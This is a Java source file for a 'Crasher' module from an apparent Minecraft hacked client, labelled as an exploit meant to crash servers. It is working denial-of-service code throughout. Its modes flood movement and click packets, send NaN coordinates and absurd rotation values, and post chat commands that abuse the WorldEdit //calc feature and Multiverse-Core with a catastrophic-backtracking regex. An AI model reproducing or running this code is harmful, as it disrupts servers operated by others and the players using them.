package me.yunetou.mod.modules.impl.exploit;

import me.yunetou.mod.modules.Category;
import me.yunetou.mod.modules.Module;
import me.yunetou.mod.modules.settings.Setting;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.network.play.client.CPacketPlayerTryUseItemOnBlock;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;

public class Crasher
        extends Module {
    public final Setting<Integer> packet = this.add(new Setting<>("Packet", 1000, 0, 3000));
    public final Setting<Mode> mode = this.add(new Setting<>("Mode", Mode.Chunk));
    private final Setting<Boolean> logoutOff = this.add(new Setting<>("LogoutOff", true));

    public Crasher() {
        super("Crasher", "crash server", Category.EXPLOIT);
    }

    @Override
    public void onTick() {
        if (this.mode.getValue() == Mode.Chunk) {
            for (double yPos = Crasher.mc.player.posY; yPos < 255.0; yPos += 5.0) {
                Crasher.mc.player.connection.sendPacket(new CPacketPlayer.Position(Crasher.mc.player.posX, yPos, Crasher.mc.player.posZ, true));
            }
            for (double i = 0.0; i < 6685.0; i += 5.0) {
                Crasher.mc.player.connection.sendPacket(new CPacketPlayer.Position(Crasher.mc.player.posX + i, 255.0, Crasher.mc.player.posZ + i, true));
            }
        } else if (this.mode.getValue() == Mode.Click) {
            for (int j = 0; j < this.packet.getValue(); ++j) {
                ItemStack item = new ItemStack(Crasher.mc.player.getHeldItem(EnumHand.MAIN_HAND).getItem());
                CPacketClickWindow packet = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, item, (short) 1);
                Crasher.mc.player.connection.sendPacket(packet);
            }
        } else if (this.mode.getValue() == Mode.AAC) {
            for (int index = 0; index < 9999; ++index) {
                Crasher.mc.player.connection.sendPacket(new CPacketPlayer.Position(Crasher.mc.player.posX + (double)(9412 * index), Crasher.mc.player.boundingBox.minY + (double)(9412 * index), Crasher.mc.player.posZ + (double)(9412 * index), true));
            }
        } else if (this.mode.getValue() == Mode.NullPoint) {
            for (int j = 0; j < this.packet.getValue(); ++j) {
                Crasher.mc.player.connection.sendPacket(new CPacketPlayerTryUseItemOnBlock(new BlockPos(Double.NaN, Double.NaN, Double.NaN), EnumFacing.UP, EnumHand.MAIN_HAND, 0.0f, 0.0f, 0.0f));
            }
        } else if (this.mode.getValue() == Mode.Rotation) {
            Crasher.mc.player.connection.sendPacket(new CPacketPlayer.Rotation(9.223372E18f, 9.223372E18f, true));
        } else if (this.mode.getValue() == Mode.WorldEdit) {
            Crasher.mc.player.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}");
            this.disable();
        } else if (this.mode.getValue() == Mode.MultiverseCore) {
            Crasher.mc.player.sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
            this.disable();
        }
    }

    @Override
    public void onLogout() {
        if (this.logoutOff.getValue() && this.isOn()) {
            this.disable();
        }
    }

    @Override
    public void onLogin() {
        if (this.logoutOff.getValue() && this.isOn()) {
            this.disable();
        }
    }

    public static enum Mode {
        Chunk,
        Click,
        AAC,
        NullPoint,
        Rotation,
        WorldEdit,
        MultiverseCore

    }
}
